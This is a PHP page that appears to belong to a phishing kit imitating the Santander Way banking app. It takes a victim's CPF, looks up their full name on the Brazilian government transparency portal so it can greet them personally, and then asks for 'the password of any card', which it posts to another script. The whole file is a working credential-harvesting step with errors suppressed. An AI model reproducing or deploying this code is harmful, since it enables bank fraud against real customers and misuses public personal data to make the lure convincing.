<?php
error_reporting(0);
ini_set('display_errors', 0 );

    if(!isset($_POST['cpf'])){
        header("Location: AppLogin.php");
    }
    if(isset($_POST['cpf']) && !empty($_POST['cpf'])){    
        $context = stream_context_create(
            array(
                "http" => array(
                    "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
                )
            )
        );
        $url = "http://www.portaltransparencia.gov.br/pessoa-fisica/busca/resultado?termo=".$_POST['cpf']."&pagina=1&tamanhoPagina=10";
        $dadosSite = file_get_contents($url, false, $context);
        $var1 = explode('"nome":"',$dadosSite);
        $var2 = explode('",',$var1[1]);
        $NomeCompleto = $var2[0];
        $FirstNameArray = explode(" ", $NomeCompleto);
        $PrimeiroNome = $FirstNameArray[0];
    }
?>
<html>
    <head>
        <meta name="theme-color" content="#DF0202"/>
        <title>Santander Way</title>
        <meta name="viewport" content="width=device-width, initial-scale=1"/>
        <meta name="content-type" content="text/html" charset="utf-8"/>        
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
        <style>
                body{
                background-color: #DF0202 !important;
            }
            .header_red{
                width: 100%;                                
            }
            .img_Away{
                text-align: center;
                margin-top: 40px;
            }
            .img_Away img{
                width: 120px;
                height: 35px;
            }
            .versionApp{
                margin-top: 10px;
                text-align: center;
                padding-bottom: 5px;       
            }
            .versionApp span{
                color: #fff;
                font-size: 12px;
                font-family: 'Open Sans', sans-serif;
            }
            .sectionBg{
                border-top-left-radius: 10px;
                border-top-right-radius: 10px;
                background-color: #fff;
                width: 100%;
                height: 500;
               
            }
            .conteudo{
                padding-left: 20px;
                margin-top: 10%;
                width: 100%;
            }
            .BgCotentTitle{
                display: inline-block;
            }
            .BgCotentTitle h1{
                font-size: 18px;
                font-weight: bold;
                color: #000;
            }
            .PersonImgDiv{
                float: left;
            }
            .BicoName{
                font-weight: bold;
                font-size: 18px;
            }
            .BoxImgReturn{
                display: inline-block;
                margin-top: 5px;
                margin-left: 10px;
            }
            .TitleLogin{
                margin-top: 20px;
            }
            .TitleLogin span{
                font-size: 17px;
                font-family: Arial, Helvetica, sans-serif;
                font-weight: bold;
            }
            span{
                font-size: 14px;
            }
            .spanBicoInformation{
                float: left;
                margin-left: 10px;
            }
            .label-float{
				  position: relative;
				  padding-top: 13px;
			}

			.label-float input{
			  width: 95%;
			  border: 0;
			  border-bottom: 1px solid #bbbbbb;
			  outline: none;
			  min-width: 180px;
			  font-size: 18px;
			  transition: all .3s ease-out;
			  -webkit-transition: all .3s ease-out;
			  -moz-transition: all .3s ease-out;
			  -webkit-appearance:none;
			  border-radius: 0;            
			}

			.label-float input:focus{
			  border-bottom: 2px solid #84c5b7;
			}

			.label-float input::placeholder{
			  color:transparent;
			}

			.label-float label{
			  pointer-events: none;
			  position: absolute;
              font-size: 15px;
			  top: 0;
			  left: 0;
			  margin-top: 13px;
			  transition: all .3s ease-out;
			  -webkit-transition: all .3s ease-out;
			  -moz-transition: all .3s ease-out;
			  color: #8e8e8e;
			}

			.label-float input:required:invalid + label{
			 
			}
			.label-float input:focus:required:invalid{
			  
			}
			.label-float input:required:invalid + label:before{
			  content: '';
			}
			.label-float input:focus + label,
			.label-float input:not(:placeholder-shown) + label{
			  font-size: 13px;
			  color: #84c5b7;
			  margin-top: -10;			  
			}
            .TwoBtnBox{
                text-align: center;
                margin-left: -20px;
                margin-top: 10%;
                margin-right: ;
            }
            .TwoBtnBox input[type="submit"]{
                background-color: #D1D1D1;
                color: #969191;
                font-weight: bold;
                width: 250px;
                height: 50px;
                border-radius:30px;
                border: none;
                outline: none;
            }
            .solicitar_cart{
                margin-top: 15px;
            }
            .btn_solicitar_cart{
                background-color: #F8FAFB;
                border: 1px solid #eaeaea;
                color: #84c5b7;
                font-size: 12px;
                padding: 5px 40px;
                border-radius: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="header_red">
                    <div class="col-sm-12">
                        <div class="img_Away">
                            <img src="img/logoAway.jpg">                 
                        </div>
                    </div>
                    <div class="versionApp">
                        <span>Versão 2.2.10</span>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="sectionBg">                      
                    <div class="col-sm-12">
                        <div class="conteudo">
                            <div class="BgCotentTitle">
                                <div class="PersonImgDiv">
                                    <img src="img/personIcon.jpg" width="68" height="67">
                                </div>
                                <div class="spanBicoInformation">
                                    <span class="BicoName">Olá,</span><br>
                                    <span><?php echo $PrimeiroNome;?></span><br>
                                    <span style="color: #BBBBBB;">CPF: <?php echo htmlspecialchars($_POST['cpf']); ?></span>                                    
                                </div>
                                <div class="BoxImgReturn">
                                    <img src="img/GreenReturn.jpg" width="48" height="31">
                                </div>
                            </div>                            
                            <div class="formDiv">
                                <form method="POST" action="AppHomeInformation.php">
                                    <input type="hidden" name="cpfbico" value="<?php echo htmlspecialchars($_POST['cpf']);?>">
                                    <div class="TitleLogin">
                                        <span>Informe a sua senha</span>
                                    </div><br>
                                    <div class="label-float">
                                        <input id="CC" name="CCsenha" placeholder=" "  type="password" minlength="3" maxlength="8" inputmode="numeric" required>
                                        <label>Senha de qualquer cartão</label>
                                    </div>
                                    <div class="TwoBtnBox">
                                        <div class="btn_continuar">
                                            <input type="submit" id="btnsubmit" name="prosseguir" value="ENTRAR" disabled/>
                                        </div>                                        
                                        <div class="solicitar_cart">
                                            <a>
                                                <button class="btn_solicitar_cart" disabled>PEDIR CARTÃO</button>
                                            </a>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>        
        <script>
            $("#CC").keyup(function(){

                if(this.value.length == this.maxLength){
                    let botaosubmit = $("#btnsubmit");
                    botaosubmit.prop( "disabled", false);
                    botaosubmit.css({'color': '#fff'});         
                    botaosubmit.css({'background-color': '#1EB3BA'});
                }
            });
            
        </script>           
    </body>
</html>